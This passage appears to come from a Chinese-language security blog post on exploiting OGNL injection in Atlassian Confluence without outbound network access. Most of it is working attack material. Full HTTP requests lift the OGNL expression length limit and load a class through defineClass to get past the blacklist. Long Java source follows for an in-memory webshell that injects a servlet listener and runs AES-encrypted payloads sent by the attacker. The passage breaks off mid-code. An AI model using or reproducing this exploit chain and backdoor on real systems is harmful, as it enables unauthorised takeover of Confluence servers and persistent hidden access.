<h2 id="0-2-2-通杀思路"><a href="#0-2-2-通杀思路" class="headerlink" title="0.2.2 通杀思路"></a>0.2.2 通杀思路</h2><p>那万一不出网呢？是不是就歇逼了？当然不是，我们仍然是可以注入内存马的，但在这之前我们需要绕过一些东西。</p>
<h3 id="0-2-2-1-长度绕过限制"><a href="#0-2-2-1-长度绕过限制" class="headerlink" title="0.2.2.1 长度绕过限制"></a>0.2.2.1 长度绕过限制</h3><p>当我们解析Ognl的时候，我们拿到的不是ognl.Ognl对象，而是ognltool对象，这个对象是默认加了黑名单以及一些过滤处理的。就比如下图中设置了maxLength为200<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674222401-9668482a-0892-4727-ad4f-73ac896a25f4.png#averageHue=%232f323a&clientId=u9363bb59-db00-4&from=paste&height=594&id=uff3ab3f5&originHeight=742&originWidth=1237&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=130487&status=done&style=none&taskId=u80c02de6-2ea1-438e-9906-2cc2818e3fb&title=&width=989.6" alt="image.png"><br>也就是我们的payload始终不能超过200，一旦超过了那么就会报错<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674304079-6d758605-8d01-45cd-8978-2dbb19edd6f5.png#averageHue=%232f323a&clientId=u9363bb59-db00-4&from=paste&height=566&id=ue7d32fa5&originHeight=708&originWidth=1321&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=130021&status=done&style=none&taskId=ub85246b4-c430-4bd8-8d41-1298b55b593&title=&width=1056.8" alt="image.png"><br>这样的话payload就作废了，那么我们不妨先看看这个属性是什么<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674327784-bf44189c-d9f1-4400-820e-a3104c4a867d.png#averageHue=%23292d36&clientId=u9363bb59-db00-4&from=paste&height=146&id=u6fa3fcd6&originHeight=183&originWidth=883&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22622&status=done&style=none&taskId=u582e4da4-760d-4e50-b973-0da747f1475&title=&width=706.4" alt="image.png"><br>一个静态的static属性，全局检索一番不难发现<br>位于<code>ognl.Ognl#applyExpressionMaxLength</code>是可以设置length的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674344249-6aced9e4-3775-409f-a312-c78340dd9206.png#averageHue=%23292d36&clientId=u9363bb59-db00-4&from=paste&height=309&id=u7dc1590f&originHeight=386&originWidth=1231&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80959&status=done&style=none&taskId=u3552ff0a-30f1-4114-9391-91ed3f2588d&title=&width=984.8" alt="image.png"><br>这个属性首先默认在配置文件中出现<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674381090-ea935f24-dfbc-46bb-b7b0-b409f1843316.png#averageHue=%23282c34&clientId=u9363bb59-db00-4&from=paste&height=211&id=u943e859a&originHeight=264&originWidth=940&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16032&status=done&style=none&taskId=u301a1231-ab56-40e8-9ce6-86e142100b0&title=&width=752" alt="image.png"><br>在8.5.1中为200，在8.5.3是150，当然这都不要紧，因为我们是可以设置length的，我们可以通过调用<code>applyExpressionMaxLength</code>方法达到类似覆盖的效果</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/template/aui/text-inline.vm</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8090</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>190</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">label=aaa\u0027%<span class="number">2</span>b#request.get(\u0027.<span class="module-access"><span class="module"><span class="identifier">KEY_velocity</span>.</span></span>struts2.context\u0027).internal<span class="constructor">Get(\<span class="params">u0027ognl</span>\<span class="params">u0027</span>)</span>.find<span class="constructor">Value(#<span class="params">parameters</span>.<span class="params">poc</span>[0],&#123;&#125;)</span>%<span class="number">2</span>b\u0027&amp;poc=@ognl.Ognl@apply<span class="constructor">ExpressionMaxLength(20000000)</span></span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674453804-7b0a8936-ab4b-4b13-a4e4-a5a68228ba08.png#averageHue=%232f3239&clientId=u9363bb59-db00-4&from=paste&height=581&id=ub62fdef2&originHeight=726&originWidth=1802&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=211946&status=done&style=none&taskId=u394367ea-d645-4b1f-b186-f403b530da2&title=&width=1441.6" alt="image.png"><br>可以看到，成功进入该方法设置属性值，第二次访问会发现属性已经被覆盖。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674484535-a3c74a0a-86db-4880-bc08-bfff0fdef2f4.png#averageHue=%232e3239&clientId=u9363bb59-db00-4&from=paste&height=592&id=u72fa4ba1&originHeight=740&originWidth=1547&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=157893&status=done&style=none&taskId=u8ec49e4c-7101-484c-b9d0-611aaa0cfac&title=&width=1237.6" alt="image.png"></p>
<h3 id="0-2-2-2-内存马注入"><a href="#0-2-2-2-内存马注入" class="headerlink" title="0.2.2.2 内存马注入"></a>0.2.2.2 内存马注入</h3><p>既然长度限制被我们解决了，那就可以注入内存马了，现在需要绕过的是Ognl内置的EvalChain检测和黑名单，这里我选择直接defineclass。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/template/aui/text-inline.vm</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8090</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11331</span><br><span class="line"></span><br><span class="line"><span class="language-stylus">label=aaa\u0027+<span class="selector-id">#request</span><span class="selector-class">.get</span>(\u0027<span class="selector-class">.KEY_velocity</span><span class="selector-class">.struts2</span>.context\u0027)<span class="selector-class">.internalGet</span>(\u0027ognl\u0027)<span class="selector-class">.findValue</span>(<span class="selector-id">#parameters</span><span class="selector-class">.poc</span><span class="selector-attr">[0]</span>,&#123;&#125;)+\u0027&amp;poc=(@org<span class="selector-class">.springframework</span><span class="selector-class">.cglib</span><span class="selector-class">.core</span>.ReflectUtils@<span class="built_in">defineClass</span>(<span class="string">&#x27;ConfluenceFilterMemshell&#x27;</span>,@org<span class="selector-class">.springframework</span><span class="selector-class">.util</span>.Base64Utils@<span class="built_in">decodeFromString</span>(<span class="string">&#x27;&#x27;</span>),@java<span class="selector-class">.lang</span>.Thread@<span class="built_in">currentThread</span>()<span class="selector-class">.getContextClassLoader</span>()))<span class="selector-class">.newInstance</span>()</span></span><br></pre></td></tr></table></figure>
<p>那么我们还该思考内存马怎么去构造，这里可以直接参考beichen师傅之前的内存马，但是需要做一些微小的变化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfluenceFilterMemshell</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">initialized</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Class payloadClass;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String key;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConfluenceFilterMemshell</span><span class="params">(ClassLoader loader)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(loader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConfluenceFilterMemshell</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lock)&#123;</span><br><span class="line">            <span class="keyword">if</span> (!initialized)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">servletRequestListenerClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        servletRequestListenerClass = Class.forName(<span class="string">&quot;jakarta.servlet.ServletRequestListener&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            servletRequestListenerClass = Class.forName(<span class="string">&quot;javax.servlet.ServletRequestListener&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (servletRequestListenerClass!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        addListener(Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;servletRequestListenerClass&#125;,<span class="built_in">this</span>),getStandardContext());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                initialized = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">getStandardContext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servletActionContextCompatManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.atlassian.confluence.compat.struts2.servletactioncontext.ServletActionContextCompatManager&quot;</span>).newInstance();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getRequest</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.atlassian.confluence.compat.struts2.servletactioncontext.ServletActionContextCompatManager&quot;</span>).getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getRequest.invoke(servletActionContextCompatManager, <span class="literal">null</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servletContext</span> <span class="operator">=</span> invokeMethod(request, <span class="string">&quot;getServletContext&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> getFieldValue(getFieldValue(servletContext,<span class="string">&quot;context&quot;</span>), <span class="string">&quot;context&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">addListener</span><span class="params">(Object listener,Object standardContext)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">addApplicationEventListenerMethod</span> <span class="operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="string">&quot;addApplicationEventListener&quot;</span>,Object.class);</span><br><span class="line">        addApplicationEventListenerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        addApplicationEventListenerMethod.invoke(standardContext,listener);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;requestInitialized&quot;</span>))&#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servletRequestEvent</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">            backDoor(servletRequestEvent);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">invokeMethod</span><span class="params">(Object obj,String methodName,Object... parameters)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ArrayList</span> <span class="variable">classes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">            <span class="keyword">if</span> (parameters!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;parameters.length;i++)&#123;</span><br><span class="line">                    Object o1=parameters[i];</span><br><span class="line">                    <span class="keyword">if</span> (o1!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        classes.add(o1.getClass());</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        classes.add(<span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> method.invoke(obj, parameters);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"><span class="comment">//        	e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> Method <span class="title function_">getMethodByClass</span><span class="params">(Class cs,String methodName,Class... parameters)</span>&#123;</span><br><span class="line">        Method method=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (cs!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method=cs.getMethod(methodName, parameters);</span><br><span class="line">                cs=<span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                cs=cs.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field f=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Field)&#123;</span><br><span class="line">            f=(Field)obj;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            Method method=<span class="literal">null</span>;</span><br><span class="line">            Class cs=obj.getClass();</span><br><span class="line">            <span class="keyword">while</span> (cs!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    f=cs.getDeclaredField(fieldName);</span><br><span class="line">                    cs=<span class="literal">null</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    cs=cs.getSuperclass();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getParameter</span><span class="params">(Object requestObject,String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (String) invokeMethod(requestObject, <span class="string">&quot;getParameter&quot;</span>, name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContentType</span><span class="params">(Object requestObject)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (String) invokeMethod(requestObject, <span class="string">&quot;getContentType&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] aes(<span class="type">byte</span>[] s,<span class="type">boolean</span> m)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;<span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="keyword">try</span> &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);m.update(s.getBytes(), <span class="number">0</span>, s.length());ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;<span class="keyword">return</span> ret; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backDoor</span><span class="params">(Object servletRequestEvent)</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> invokeMethod(servletRequestEvent,<span class="string">&quot;getServletRequest&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">responseforvalidate</span> <span class="operator">=</span> getFieldValue(getFieldValue(request, <span class="string">&quot;request&quot;</span>), <span class="string">&quot;response&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.invokeMethod(responseforvalidate,<span class="string">&quot;setHeader&quot;</span>,<span class="string">&quot;X-Cmd-Result&quot;</span>,<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">contentType</span> <span class="operator">=</span> getContentType(request);</span><br><span class="line">                    <span class="keyword">if</span> (contentType!=<span class="literal">null</span> &amp;&amp; contentType.contains(<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> getParameter(request,password);</span><br><span class="line">                        <span class="keyword">if</span> (value!=<span class="literal">null</span>)&#123;</span><br><span class="line">                            <span class="type">byte</span>[] data = Base64.getDecoder().decode(value);</span><br><span class="line">                            data = aes(data, <span class="literal">false</span>);</span><br><span class="line">                            <span class="keyword">if</span> (data != <span class="literal">null</span> &amp;&amp; data.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span> (payloadClass == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    payloadClass =  <span class="keyword">new</span> <span class="title class_">ConfluenceFilterMemshell</span>(request.getClass().getClassLoader()).defineClass(data,<span class="number">0</span>,data.length);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">                                    <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> payloadClass.newInstance();</span><br><span class="line">                                    f.equals(arrOut);</span><br><span class="line">                                    f.equals(request);</span><br><span class="line">                                    f.equals(data);</span><br><span class="line">                                    f.toString();</span><br><span class="line"></span><br><span class="line">                                    <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5(password + key);</span><br><span class="line">                                    <span class="keyword">if</span> (arrOut.size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                                        <span class="type">Object</span> <span class="variable">response</span> <span class="operator">=</span>  getFieldValue(getFieldValue(request,<span class="string">&quot;request&quot;</span>),<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                                        <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> (PrintWriter) invokeMethod(response,<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">                                        printWriter.write(md5.substring(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">                                        printWriter.write(Base64.getEncoder().encodeToString(aes(arrOut.toByteArray(), <span class="literal">true</span>)));</span><br><span class="line">                                        printWriter.write(md5.substring(<span class="number">16</span>));</span><br><span class="line">                                        printWriter.flush();</span><br><span class="line">                                        printWriter.close();</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            